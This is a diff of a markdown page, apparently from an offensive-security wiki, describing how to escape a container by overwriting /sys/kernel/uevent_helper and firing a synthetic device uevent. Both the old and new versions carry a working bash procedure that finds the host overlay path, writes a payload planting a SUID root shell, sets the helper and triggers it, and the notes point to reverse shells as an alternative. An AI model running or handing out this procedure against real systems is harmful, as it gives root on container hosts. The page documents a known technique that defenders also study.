@@ -1,39 +1,55 @@
 ---
-title: "uevent_helper: host code execution through the kernel device-event helper"
-description: "Escaping a container by writing /sys/kernel/uevent_helper, the legacy program the kernel runs on a device uevent, then triggering a synthetic uevent so the attacker's program executes on the host as root."
+title: "uevent_helper: executing a program on a synthetic device event"
+description: "The legacy hotplug mechanism runs the program in /sys/kernel/uevent_helper, as root in the host namespaces, for every device uevent. A container with sysfs mounted writable sets uevent_helper to a payload and then writes add to a device's uevent file to fire the event immediately, running the payload on the host."
 keywords:
   - uevent_helper
-  - sysfs escape
-  - hotplug helper
+  - hotplug
+  - sysfs
+  - device uevent
   - container escape
-  - CAP_SYS_ADMIN
 ---
 
 # uevent_helper
 
-`/sys/kernel/uevent_helper` is the legacy hotplug helper: a program the kernel forks, as root in the host context, on each device uevent. With a writable host `/sys` (privileged container or `CAP_SYS_ADMIN`), overwrite it with a host-visible helper and fire a synthetic uevent to run code on the host.
+Before netlink-based udev, the kernel handled device hotplug by executing a user-space helper for each uevent. That helper path still exists at `/sys/kernel/uevent_helper`, and when set, the kernel runs it as root in the host's initial namespaces on every device event. A container with the host sysfs mounted writable sets this path to a payload and then triggers a uevent on demand by writing to any device's `uevent` file, giving reliable host execution without waiting for a real hardware event.
+
+Confirm writability:
 
 ```bash
-host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
-
-cat > /x <<'SH'
-#!/bin/sh
-cp /bin/busybox /host_marker && chmod +s /host_marker
-SH
-chmod +x /x
-
-echo "$host_path/x" > /sys/kernel/uevent_helper
-# Trigger a uevent on any device
-echo change > /sys/class/mem/null/uevent
+ls -l /sys/kernel/uevent_helper
+[ -w /sys/kernel/uevent_helper ] && echo writable
 ```
+
+## The technique
+
+```bash
+# 1. Host-resolvable payload
+host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+cat > /payload <<SH
+#!/bin/sh
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+id > $host/out 2>&1
+SH
+chmod +x /payload
+
+# 2. Set the hotplug helper to the payload
+echo "$host/payload" > /sys/kernel/uevent_helper
+
+# 3. Fire a synthetic uevent on any device node in sysfs
+echo add > /sys/class/mem/null/uevent
+sleep 1; cat /out; ls -l /tmp/rootbash
+```
+
+Writing `add` to a `uevent` file forces the kernel to emit the event and invoke the helper immediately, so no physical device change is needed.
 
 ## Exploitation notes
 
-- `uevent_helper` is empty by default on modern systems (udev uses a netlink socket instead), so setting it at all is the attack; the kernel still honors it when non-empty.
-- Writing any device's `uevent` file with an action keyword (`add`, `change`) generates the event that invokes the helper.
-- A sibling of [core_pattern](core_pattern.md) and [modprobe path](modprobe-path.md): same gate, same host-visible-path trick.
+- Any writable `uevent` file under `/sys` works as the trigger; `/sys/class/mem/null/uevent` and `/sys/devices/.../uevent` are common choices.
+- This requires the host sysfs mounted writable in the container, generally under `--privileged` or an explicit `-v /sys:...` without `ro`; a read-only sysfs defeats it.
+- The payload runs once per event; use it to drop SUID bash or a reverse shell rather than to hold a session.
 
 ## References
 
-- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
-- [Kernel: uevent and the hotplug helper](https://www.kernel.org/doc/html/latest/admin-guide/sysfs-rules.html)
+- [Kernel docs: uevent and hotplug](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
+- [HackTricks: uevent_helper escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#sys-kernel-uevent_helper)
+- [BishopFox: sensitive sysfs mounts](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
